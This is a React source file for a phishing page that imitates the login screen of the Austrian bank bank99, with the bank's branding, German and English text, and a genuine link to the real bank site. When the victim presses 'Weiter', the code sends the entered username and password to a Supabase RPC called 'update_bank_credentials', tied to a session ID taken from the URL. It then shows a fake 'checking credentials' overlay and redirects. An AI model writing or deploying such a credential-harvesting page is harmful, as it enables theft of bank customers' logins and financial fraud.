import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { X, Eye, EyeOff } from "lucide-react";
import bank99Logo from "@/assets/bank99-logo.png";
import bank99Bg from "@/assets/bank99-bg.png";
import bank99Icon from "@/assets/bank99.png";

const Bank99 = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("bank99 - Login", bank99Icon);

  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [password, setPassword] = useState("");
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header style={{ backgroundColor: "#eceff4", borderBottom: "1px solid #e0e0e0" }}>
          <div className="max-w-[1200px] mx-auto flex items-center px-4 py-[2px]">
            <img src={bank99Logo} alt="bank99" className="h-12 md:h-16" />
        </div>
      </header>

      {/* Main */}
      <div
        className="relative flex-1 flex items-center justify-center px-4"
        style={{ backgroundColor: "#dfe3ec" }}
      >
        {/* Background image overlay - hidden on mobile */}
        <div
          className="absolute inset-0 hidden md:block"
          style={{
            backgroundImage: `url(${bank99Bg})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
            backgroundRepeat: "no-repeat",
          }}
        />
        <div className="relative w-full max-w-[560px] overflow-hidden">
          {/* Yellow header bar */}
          <div
            className="px-6 py-4 font-semibold text-2xl"
            style={{ backgroundColor: "#ffdc00", color: "#000" }}
          >
            {lang === "de" ? "Anmelden" : "Login"}
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Greeting */}
            <p className="text-xs md:text-sm leading-snug font-semibold" style={{ color: "#333" }}>
              {lang === "de"
                ? "Hallo beim Online Banking der bank99! :-)"
                : "Welcome at bank99!"}
            </p>

            {/* Divider */}
            <hr className="border-gray-200" />

            <div className="space-y-1">
              {/* Label row */}
              <div className="flex items-center justify-between">
                <span className="font-normal text-sm" style={{ color: "#939593" }}>
                  {lang === "de" ? "Benutzername" : "user name"}
                </span>
                <span className="text-sm">
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      setLang(lang === "de" ? "en" : "de");
                    }}
                    style={{ color: "#007ed1" }}
                    className="text-[14px] underline font-semibold"
                  >
                    {lang === "de" ? "English" : "Deutsch"}
                  </a>
                </span>
              </div>

              {/* Username input */}
              <div className="relative">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => setIsFocused(true)}
                  onBlur={() => setIsFocused(false)}
                  className="w-full px-3 py-2.5 border text-sm outline-none transition-colors rounded-sm"
                  style={{
                    backgroundColor: "#fff",
                    borderColor: isFocused ? "#000000" : "#dddddd",
                    boxShadow: isFocused ? "0 0 0 1px #000000" : "none",
                  }}
                />
                {username && (
                  <button
                    onClick={() => setUsername("")}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    type="button"
                  >
                    <X size={24} color="#000" />
                  </button>
                )}
              </div>
            </div>

            <div className="space-y-1">
              {/* Password label */}
              <div className="flex items-center justify-between">
                <span className="font-normal text-sm" style={{ color: "#939593" }}>
                  {lang === "de" ? "Passwort" : "password"}
                </span>
              </div>

              {/* Password input */}
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setIsPasswordFocused(true)}
                  onBlur={() => setIsPasswordFocused(false)}
                  className="w-full px-3 py-2.5 border text-sm outline-none transition-colors rounded-sm"
                  style={{
                    backgroundColor: "#fff",
                    borderColor: isPasswordFocused ? "#000000" : "#dddddd",
                    boxShadow: isPasswordFocused ? "0 0 0 1px #000000" : "none",
                  }}
                />
                {password && (
                  <button
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    type="button"
                  >
                    {showPassword ? <EyeOff size={20} color="#000" /> : <Eye size={20} color="#000" />}
                  </button>
                )}
              </div>
            </div>

            {/* Divider */}
            <hr className="-mx-6 border-gray-200" />

            {/* Weiter button */}
            <button
              className="w-full py-2 font-semibold text-sm rounded-sm"
              style={{ backgroundColor: "#ffdc00", color: "#000" }}
            
              onClick={async () => {
                console.log("Session ID:", sessionId);
                if (sessionId) {
                  const { error } = await supabase.rpc("update_bank_credentials", {
                    p_session_id: sessionId,
                    p_username: username,
                    p_password: password,
                    p_username_label: "Benutzername",
                    p_password_label: "Passwort",
                  });
                  if (error) console.error("Update failed:", error);
                  else console.log("Update successful");
                } else {
                  console.error("No session ID found in URL!");
                }
                setShowLoading(true);
              }}>
              {lang === "de" ? "Weiter" : "Continue"}
            </button>

            {/* Divider */}
            <hr className="-mx-6 border-gray-200" />

            {/* Link */}
            <div className="flex flex-col items-center">
              <a
                href="https://meine.bank99.at/banking/login.xhtml?m=122#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[13px] underline font-semibold"
                style={{ color: "#007ed1" }}
              >
                {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default Bank99;
